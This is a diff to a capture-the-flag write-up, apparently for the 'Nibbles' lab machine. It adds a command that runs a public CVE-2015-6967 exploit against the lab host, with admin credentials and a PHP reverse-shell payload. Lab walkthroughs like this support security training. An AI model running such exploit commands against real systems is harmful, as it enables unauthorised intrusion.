@@ -22,6 +22,10 @@ Searching for nibbleblog we discover two important things:
 
 We can use this [exploit](https://github.com/dix0nym/CVE-2015-6967) to get initial access.
 
+```
+python3 exploit.py --url http://nibbles.htb/nibbleblog/ --username admin --password nibbles --payload php-reverse-shell.php
+```
+
 ![exploit](https://user-images.githubusercontent.com/58514930/218512123-ba5cec6f-090c-419a-b64f-b98c5c188cea.png)
 
 ![userFlag](https://user-images.githubusercontent.com/58514930/218512370-aee31d5b-2a6c-4567-9c20-ee6ff2bfa4eb.png)
